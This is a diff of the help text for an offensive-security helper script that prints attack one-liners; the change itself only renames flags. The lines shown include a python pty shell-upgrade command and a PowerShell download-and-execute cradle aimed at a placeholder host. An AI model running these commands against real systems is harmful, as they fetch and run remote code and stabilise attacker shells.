@@ -99,12 +99,12 @@ MSFVENOM STAGED
                 (requires xsel)
 
 LAZY OPTIONS
--pl2		python -c 'import pty; pty.spawn("/bin/bash")'
--pl3 		python3 -c 'import pty; pty.spawn("/bin/bash")'
+-pu2		python -c 'import pty; pty.spawn("/bin/bash")'
+-pu3 		python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 		loads up line for python shell upgrade
 
-		usage:		./lineplease.sh -pl2
+		usage:		./lineplease.sh -pu2
 
 -psd		powershell "IEX(New-Object Net.WebClient).downloadString('http://[ip]:[port]/[filename]')"
 
